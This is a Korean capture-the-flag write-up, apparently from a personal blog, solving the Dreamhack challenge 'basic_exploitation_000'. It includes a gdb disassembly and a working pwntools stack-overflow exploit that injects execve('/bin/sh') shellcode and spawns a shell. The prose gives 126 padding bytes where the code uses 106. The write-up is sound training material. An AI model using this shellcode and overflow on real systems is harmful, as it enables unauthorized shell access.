---
title: basic_exploitation_000
author: hwang
date: 2024-05-12 17:43:00 +0900
categories: [Dreamhack, System Hacking]
tags: [basic_exploitation_000]     # TAG names should always be lowercase
---

# basic_exploitation_000

## Description
이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_000)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

## Environment
```text
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

## Solution
먼저, basic_exploitation_000에 적용된 보안 기법을 확인하였다.
```bash
$ checksec basic_exploitation_000
```
결과는 위의 Environment와 같다. x86 아키텍쳐에서 작동하고, canary나 NX, ASLR등이 적용되어 있지 않다.

이후, 이 프로그램의 스택 프레임을 확인하기 위해, 어셈블리어를 분석하였다. pwndbg을 이용하여 디버깅을 하였다.
```bash
$ sudo gdb -q basic_exploitation_000

pwndbg> disassemble main
```
main함수를 disassemble한 결과는 다음과 같다.
```text
Dump of assembler code for function main:
   0x080485d9 <+0>:	push   ebp
   0x080485da <+1>:	mov    ebp,esp
   0x080485dc <+3>:	add    esp,0xffffff80
   0x080485df <+6>:	call   0x8048592 <initialize>
   0x080485e4 <+11>:	lea    eax,[ebp-0x80]
   0x080485e7 <+14>:	push   eax
   0x080485e8 <+15>:	push   0x8048699 //"buf = (%p)\n"
   0x080485ed <+20>:	call   0x80483f0 <printf@plt>
   0x080485f2 <+25>:	add    esp,0x8
   0x080485f5 <+28>:	lea    eax,[ebp-0x80]
   0x080485f8 <+31>:	push   eax
   0x080485f9 <+32>:	push   0x80486a5 //"%141s"
   0x080485fe <+37>:	call   0x8048460 <__isoc99_scanf@plt>
   0x08048603 <+42>:	add    esp,0x8
   0x08048606 <+45>:	mov    eax,0x0
   0x0804860b <+50>:	leave  
   0x0804860c <+51>:	ret    
End of assembler dump.
```
어셈블리어를 통해 처음 버퍼의 주소값을 출력하고, 이후 버퍼에 141바이트 만큼 입력받는다. 버퍼의 크기가 128바이트(0x80)이므로, 스택 버퍼 오버플로우 공격을 통해 쉘을 얻을 수 있다. 

ebp레지스터의 크기는 32비트에서 4바이트이므로, scanf를 우회하는 26바이트의 쉘코드에 임의의 문자를 126바이트 입력하고, 이후 버퍼의 주소값을 입력하는 페이로드를 작성하면 쉘코드를 실행시킬 수 있다.

파이썬을 이용하여 exploit 코드를 만들었다.

```python
from pwn import *

p = process('./basic_exploitation_000')

data = p.recvuntil(b'buf = (')
data = int(p.recvn(10), 16)

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

payload = shellcode
payload += b"A"*106
payload += p32(data)


p.sendafter(')',payload)
p.interactive()
```

이후 실행시키면 잘 작동한다.
